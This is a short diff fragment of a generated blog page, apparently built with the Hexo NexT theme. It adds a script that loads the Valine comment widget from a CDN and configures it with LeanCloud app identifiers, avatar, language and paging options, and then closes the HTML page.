+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
